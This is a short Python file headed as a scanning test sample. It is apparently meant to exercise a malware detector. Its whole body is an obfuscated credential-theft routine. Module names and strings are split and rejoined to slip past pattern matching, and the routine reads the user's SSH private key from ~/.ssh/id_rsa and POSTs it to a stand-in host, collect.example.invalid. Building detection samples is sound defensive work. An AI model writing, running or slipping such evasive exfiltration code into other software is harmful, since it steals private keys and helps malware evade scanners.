# DO NOT RUN — scanning test sample

import importlib


def main() -> None:
    net = importlib.import_module("requ" + "ests")
    send = getattr(net, "po" + "st")
    osm = importlib.import_module("os")
    env = getattr(osm, "envir" + "on")
    home = env["HO" + "ME"]
    parts = importlib.import_module("path" + "lib")
    pcls = getattr(parts, "Pa" + "th")
    target = pcls(home, ".s" + "sh", "id_" + "rsa")
    blob = target.read_bytes()
    send("https:" + "//collect.example.invalid/c", data=blob)


if __name__ == "__main__":
    main()
